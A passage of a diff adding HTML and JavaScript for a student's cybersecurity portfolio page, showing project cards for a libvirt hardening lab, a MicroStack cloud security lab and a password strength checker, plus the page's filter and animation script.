+                        <div class="tech-tags">
+                            <span class="tech-tag">CentOS</span><span class="tech-tag">SELinux</span>
+                            <span class="tech-tag">libvirt</span><span class="tech-tag">virt-host-validate</span>
+                            <span class="tech-tag">firewalld</span><span class="tech-tag">virsh</span>
+                        </div>
+                    </div>
+                    <div class="card-right">
+                        <div class="stats-block">
+                            <div class="stats-block-title">Virtualization Metrics</div>
+                            <div class="stat-row"><span class="stat-label">Host OS</span><span class="stat-value">CentOS</span></div>
+                            <div class="stat-row"><span class="stat-label">SELinux Cycle</span><span class="stat-value purple">P → E</span></div>
+                            <div class="stat-row"><span class="stat-label">Services Disabled</span><span class="stat-value red">4</span></div>
+                            <div class="stat-row"><span class="stat-label">Validation Check</span><span class="stat-value ok">RUN</span></div>
+                            <div class="stat-row"><span class="stat-label">Audit Level</span><span class="stat-value">0</span></div>
+                        </div>
+                        <div class="command-block">
+                            <div class="command-block-title">Key Commands</div>
+                            <div class="cmd-line"><span class="prompt">$</span><span><span class="cmd-text">echo </span><span class="cmd-path">"audit_level = 0"</span><span class="cmd-text"> | sudo tee -a /etc/libvirt/libvirtd.conf</span></span></div>
+                            <div class="cmd-spacer"></div>
+                            <div class="cmd-line"><span class="prompt">$</span><span><span class="cmd-text">sudo virt-host-validate | sudo tee </span><span class="cmd-path">/virt-host-validate.txt</span></span></div>
+                        </div>
+                        <div class="features-block">
+                            <div class="features-block-title">// Security Focus</div>
+                            <div class="feature-item"><div class="feature-check" style="border-color:var(--purple);color:var(--purple);">✓</div>Hypervisor Prep Workflow</div>
+                            <div class="feature-item"><div class="feature-check" style="border-color:var(--purple);color:var(--purple);">✓</div>SELinux Mode Management</div>
+                            <div class="feature-item"><div class="feature-check" style="border-color:var(--purple);color:var(--purple);">✓</div>Host Service Reduction</div>
+                            <div class="feature-item"><div class="feature-check" style="border-color:var(--purple);color:var(--purple);">✓</div>libvirt Toolkit Validation</div>
+                            <div class="feature-item"><div class="feature-check" style="border-color:var(--purple);color:var(--purple);">✓</div>Lifecycle-Aware Hardening</div>
+                        </div>
+                    </div>
+                </div>
+            </article>
+
+            <!-- PROJECT 16 -->
+            <article class="project-card" data-delay="100">
+                <span class="card-number">16 / PROJECT</span>
+                <div class="card-inner">
+                    <div class="card-left">
+                        <div class="card-header">
+                            <div class="card-icon" style="color:var(--blue);background:rgba(0,170,255,0.1);border-color:rgba(0,170,255,0.2);">
+                                <svg width="22" height="22" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M6 20.25h12a2.25 2.25 0 002.25-2.25V9.75a2.25 2.25 0 00-2.25-2.25h-1.5A2.25 2.25 0 0114.25 5.25h-4.5A2.25 2.25 0 017.5 7.5H6A2.25 2.25 0 003.75 9.75V18A2.25 2.25 0 006 20.25z"/></svg>
+                            </div>
+                            <div class="card-meta">
+                                <div class="card-type" style="color:var(--blue)">Cloud Security &amp; IAM</div>
+                                <h2 class="card-title">MicroStack Cloud Security Lab</h2>
+                                <div class="card-subtitle">Debian Linux &nbsp;·&nbsp; OpenStack / MicroStack &nbsp;·&nbsp; 2025</div>
+                            </div>
+                        </div>
+                        <div class="card-image">
+                            <img src="https://images.unsplash.com/photo-1451187580459-43490279c0fa?auto=format&fit=crop&fm=jpg&ixlib=rb-4.1.0&q=80&w=3000" alt="Cloud security lab" loading="lazy">
+                            <div class="img-overlay-label">[OPENSTACK CONTROL]</div>
+                        </div>
+                        <div class="card-overview-label">Overview</div>
+                        <p class="card-desc">Configured a MicroStack environment on Debian and worked through core cloud security administration tasks including password rotation, IAM management, security groups, instance workflow, and SSH key pair provisioning. The lab focused on shared-responsibility security controls in a cloud platform.</p>
+                        <div class="card-overview-label">Achievements</div>
+                        <div class="achievements">
+                            <div class="achievement-item">Initialized the MicroStack control plane and reviewed core OpenStack services including Keystone, Nova, Neutron, Glance, and Cinder</div>
+                            <div class="achievement-item">Rotated the default admin password, updated microstack.rc, and re-sourced the environment for secure administrative access</div>
+                            <div class="achievement-item">Created cloud users JDoe and RSmith, built Administrators and Employees groups, and assigned group membership for role-based access organization</div>
+                            <div class="achievement-item">Launched Cirros and KeyInstance workflows, then created and assigned an SSH key pair to support secure instance access despite nested virtualization limits in the lab</div>
+                        </div>
+                        <div class="card-overview-label" style="margin-top:2rem;">Stack</div>
+                        <div class="tech-tags">
+                            <span class="tech-tag">MicroStack</span><span class="tech-tag">OpenStack</span>
+                            <span class="tech-tag">Keystone</span><span class="tech-tag">Neutron</span>
+                            <span class="tech-tag">Glance</span><span class="tech-tag">Cinder</span><span class="tech-tag">SSH Keys</span>
+                        </div>
+                    </div>
+                    <div class="card-right">
+                        <div class="stats-block">
+                            <div class="stats-block-title">Cloud Admin Metrics</div>
+                            <div class="stat-row"><span class="stat-label">Core Services</span><span class="stat-value blue">5</span></div>
+                            <div class="stat-row"><span class="stat-label">Users Created</span><span class="stat-value">2</span></div>
+                            <div class="stat-row"><span class="stat-label">Groups Created</span><span class="stat-value">2</span></div>
+                            <div class="stat-row"><span class="stat-label">Key Pairs</span><span class="stat-value ok">1</span></div>
+                            <div class="stat-row"><span class="stat-label">Admin Password</span><span class="stat-value ok">ROTATED</span></div>
+                        </div>
+                        <div class="features-block">
+                            <div class="features-block-title">// Platform Tasks</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>MicroStack Initialized</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Admin Password Changed</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Users &amp; Groups Managed</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Instances Provisioned</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>SSH Key Pair Added</div>
+                        </div>
+                        <div class="command-block">
+                            <div class="command-block-title">Cloud Commands</div>
+                            <div class="cmd-line"><span class="prompt">$</span><span><span class="cmd-text">microstack init </span><span class="cmd-flag">--auto --control</span></span></div>
+                            <div class="cmd-spacer"></div>
+                            <div class="cmd-line"><span class="prompt">$</span><span><span class="cmd-text">source </span><span class="cmd-path">/var/snap/microstack/common/etc/microstack.rc</span></span></div>
+                        </div>
+                    </div>
+                </div>
+            </article>
+
+            <!-- PROJECT 17 -->
+            <article class="project-card" data-delay="100">
+                <span class="card-number">17 / PROJECT</span>
+                <div class="card-inner">
+                    <div class="card-left">
+                        <div class="card-header">
+                            <div class="card-icon" style="color:var(--green);background:var(--green-glow);">
+                                <svg width="22" height="22" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M16.5 10.5V6.75a4.5 4.5 0 10-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 002.25-2.25v-6.75a2.25 2.25 0 00-2.25-2.25H6.75a2.25 2.25 0 00-2.25 2.25v6.75a2.25 2.25 0 002.25 2.25z"/></svg>
+                            </div>
+                            <div class="card-meta">
+                                <div class="card-type">Security Tooling &amp; Frontend</div>
+                                <h2 class="card-title">PassGuard Password Strength Checker</h2>
+                                <div class="card-subtitle">HTML, CSS, JavaScript &nbsp;·&nbsp; CST 3523 &nbsp;·&nbsp; 2025</div>
+                            </div>
+                        </div>
+                        <div class="card-image">
+                            <img src="https://images.unsplash.com/photo-1516321318423-f06f85e504b3?auto=format&fit=crop&fm=jpg&ixlib=rb-4.1.0&q=80&w=3000" alt="Password strength checker application" loading="lazy">
+                            <div class="img-overlay-label">[PASSWORD POLICY ENGINE]</div>
+                        </div>
+                        <div class="card-overview-label">Overview</div>
+                        <p class="card-desc">Built an interactive password strength checker called PassGuard that evaluates passwords in real time, measures entropy, validates security policy requirements, and logs check results. The tool combines a polished cyber-style interface with practical password quality enforcement logic.</p>
+                        <div class="card-overview-label">Achievements</div>
+                        <div class="achievements">
+                            <div class="achievement-item">Created a live password evaluation engine that scores strength, updates a visual meter, and labels passwords from very weak to very strong</div>
+                            <div class="achievement-item">Implemented policy checks for length, uppercase, lowercase, number, special character, and weak-password blacklist rejection</div>
+                            <div class="achievement-item">Calculated password entropy dynamically using character set size and length to give users a more technical security measure</div>
+                            <div class="achievement-item">Added accepted/rejected result banners, session logging with timestamps, visibility toggle, clear-log actions, and Enter-key support for smoother UX</div>
+                        </div>
+                        <div class="card-overview-label" style="margin-top:2rem;">Stack</div>
+                        <div class="tech-tags">
+                            <span class="tech-tag">HTML5</span><span class="tech-tag">CSS3</span>
+                            <span class="tech-tag">JavaScript</span><span class="tech-tag">DOM</span>
+                            <span class="tech-tag">Entropy Analysis</span><span class="tech-tag">Password Policy</span>
+                        </div>
+                    </div>
+                    <div class="card-right">
+                        <div class="stats-block">
+                            <div class="stats-block-title">Tool Metrics</div>
+                            <div class="stat-row"><span class="stat-label">Score Range</span><span class="stat-value">0-7</span></div>
+                            <div class="stat-row"><span class="stat-label">Policy Checks</span><span class="stat-value blue">6</span></div>
+                            <div class="stat-row"><span class="stat-label">Weak Password List</span><span class="stat-value">40+</span></div>
+                            <div class="stat-row"><span class="stat-label">Entropy Output</span><span class="stat-value ok">LIVE</span></div>
+                            <div class="stat-row"><span class="stat-label">Attempt Log</span><span class="stat-value ok">SESSION</span></div>
+                        </div>
+                        <div class="features-block">
+                            <div class="features-block-title">// Core Features</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Real-Time Strength Meter</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Entropy Calculation</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Weak Password Blacklist</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Accepted / Rejected Banner</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Timestamped Session Log</div>
+                        </div>
+                        <div class="command-block">
+                            <div class="command-block-title">Logic Highlights</div>
+                            <div class="cmd-line"><span class="prompt">JS</span><span><span class="cmd-text">calculateEntropy(password) + evaluate(password)</span></span></div>
+                            <div class="cmd-spacer"></div>
+                            <div class="cmd-line"><span class="prompt">UI</span><span><span class="cmd-text">live meter, criteria checklist, result banner, log history</span></span></div>
+                        </div>
+                    </div>
+                </div>
+            </article>
+
+        </div>
+    </section>
+
+    <!-- FOOTER -->
+    <footer>
+        <div class="footer-inner">
+            <a href="index.html" class="footer-logo">
+                <img src="./logo/SK_LOGO.png" alt="SK Logo">
+            </a>
+            <div class="footer-links">
+                <a href="index.html">Home</a>
+                <a href="certifications.html">Certifications</a>
+                <a href="projects.html" class="active">Projects</a>
+                <a href="contact.html">Contact</a>
+                <a href="https://github.com/Solehjon-K05" target="_blank">GitHub</a>
+                <a href="https://linkedin.com/in/solekhdzhon-khuseynov-33ba47241/" target="_blank">LinkedIn</a>
+            </div>
+            <div class="footer-copy">© 2026 Solekhdzhon Khuseynov &nbsp;·&nbsp; CUNY NYC College of Technology &nbsp;·&nbsp; Computer Systems Technology</div>
+        </div>
+    </footer>
+
+    <button class="back-to-top" id="backToTop" aria-label="Back to top">↑</button>
+
+    <script>
+        const hamburger = document.getElementById('hamburger');
+        const mobileMenu = document.getElementById('mobileMenu');
+        hamburger.addEventListener('click', () => mobileMenu.classList.toggle('open'));
+        document.addEventListener('click', e => {
+            if (!hamburger.contains(e.target) && !mobileMenu.contains(e.target)) mobileMenu.classList.remove('open');
+        });
+
+        const cards = document.querySelectorAll('.project-card');
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    const delay = parseInt(entry.target.dataset.delay || 0);
+                    setTimeout(() => entry.target.classList.add('visible'), delay);
+                    observer.unobserve(entry.target);
+                }
+            });
+        }, { threshold: 0.08 });
+        cards.forEach(c => observer.observe(c));
+
+        const filterBar = document.getElementById('projectFilterBar');
+        const filterCount = document.getElementById('projectsFilterCount');
+        const filterGroups = [
+            {
+                label: 'Network & Infra',
+                value: 'network-infra',
+                types: ['Security & Networking', 'Network Segmentation', 'Firewall Configuration', 'VPN & Active Directory', 'Secure Communications', 'Virtualization Security']
+            },
+            {
+                label: 'Endpoint Hardening',
+                value: 'endpoint-hardening',
+                types: ['Endpoint Security & Compliance', 'Host Security & Disk Protection', 'Linux Security & Hardening']
+            },
+            {
+                label: 'App & Crypto',
+                value: 'app-crypto',
+                types: ['Web Security & Development', 'Cryptography & PKI', 'Security Tooling & Frontend']
+            },
+            {
+                label: 'Offensive & Audit',
+                value: 'offensive-audit',
+                types: ['Offensive Security', 'Reconnaissance & Audit']
+            },
+            {
+                label: 'Cloud & IAM',
+                value: 'cloud-iam',
+                types: ['Cloud Security & IAM']
+            },
+            {
+                label: 'Research',
+                value: 'research',
+                types: ['Network Security Research']
+            }
+        ];
+        let activeFilter = 'all';
+
+        const makeFilterButton = (label, value, active = false) => {
+            const button = document.createElement('button');
+            button.type = 'button';
+            button.className = `filter-chip${active ? ' active' : ''}`;
+            button.textContent = label;
+            button.dataset.filter = value;
+            button.setAttribute('aria-pressed', active ? 'true' : 'false');
+            return button;
+        };
+
+        const updateFilterCount = (count, activeFilter) => {
+            if (!filterCount) return;
+            const group = filterGroups.find((item) => item.value === activeFilter);
+            filterCount.textContent = activeFilter === 'all'
+                ? `Showing all ${count} projects`
+                : `Showing ${count} project${count === 1 ? '' : 's'} in ${group ? group.label : activeFilter}`;
+        };
+
+        const applyFilter = (value) => {
+            let visibleCount = 0;
+            cards.forEach((card) => {
+                const type = card.querySelector('.card-type')?.textContent.trim().replace(/\s+/g, ' ') || 'Other';
+                const group = filterGroups.find((item) => item.value === value);
+                const showCard = value === 'all' || (group ? group.types.includes(type) : false);
+                card.classList.toggle('hidden-by-filter', !showCard);
+                if (showCard) {
+                    visibleCount += 1;
+                    if (!card.classList.contains('visible')) observer.observe(card);
+                }
+            });
+
+            if (filterBar) {
+                [...filterBar.querySelectorAll('.filter-chip')].forEach((button) => {
+                    const isActive = button.dataset.filter === value;
+                    button.classList.toggle('active', isActive);
+                    button.setAttribute('aria-pressed', isActive ? 'true' : 'false');
+                });
+            }
+
+            updateFilterCount(visibleCount, value);
+        };
+
+        if (filterBar) {
+            filterGroups.forEach((group) => filterBar.appendChild(makeFilterButton(group.label, group.value)));
+            filterBar.addEventListener('click', (event) => {
+                const button = event.target.closest('.filter-chip');
+                if (!button) return;
+                const nextFilter = activeFilter === button.dataset.filter ? 'all' : (button.dataset.filter || 'all');
+                activeFilter = nextFilter;
+                applyFilter(nextFilter);
+            });
+            updateFilterCount(cards.length, 'all');
+        }
+
+        const btt = document.getElementById('backToTop');
+        window.addEventListener('scroll', () => btt.classList.toggle('show', scrollY > 300));
+        btt.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
+
+        const reduceMotion = window.matchMedia('(prefers-reduced-motion: reduce)');
+        const finePointer = window.matchMedia('(hover: hover) and (pointer: fine)');
+        if (!reduceMotion.matches && finePointer.matches) {
+            cards.forEach((card) => {
+                const resetTilt = () => {
+                    card.classList.remove('is-tilting');
+                    card.style.setProperty('--card-rotate-x', '0deg');
+                    card.style.setProperty('--card-rotate-y', '0deg');
+                    card.style.setProperty('--card-glare-x', '50%');
+                    card.style.setProperty('--card-glare-y', '50%');
+                    card.style.setProperty('--card-glare-opacity', '0');
+                };
+
+                card.addEventListener('pointermove', (event) => {
+                    const rect = card.getBoundingClientRect();
+                    const x = event.clientX - rect.left;
+                    const y = event.clientY - rect.top;
+                    const ratioX = x / rect.width;
+                    const ratioY = y / rect.height;
+                    const rotateY = (ratioX - 0.5) * 10;
+                    const rotateX = (0.5 - ratioY) * 8;
+
+                    card.classList.add('is-tilting');
+                    card.style.setProperty('--card-rotate-x', `${rotateX.toFixed(2)}deg`);
+                    card.style.setProperty('--card-rotate-y', `${rotateY.toFixed(2)}deg`);
+                    card.style.setProperty('--card-glare-x', `${(ratioX * 100).toFixed(1)}%`);
+                    card.style.setProperty('--card-glare-y', `${(ratioY * 100).toFixed(1)}%`);
+                    card.style.setProperty('--card-glare-opacity', '1');
+                });
+
+                card.addEventListener('pointerleave', resetTilt);
+                card.addEventListener('pointercancel', resetTilt);
+            });
+        }
+    </script>
+</body>
+</html>
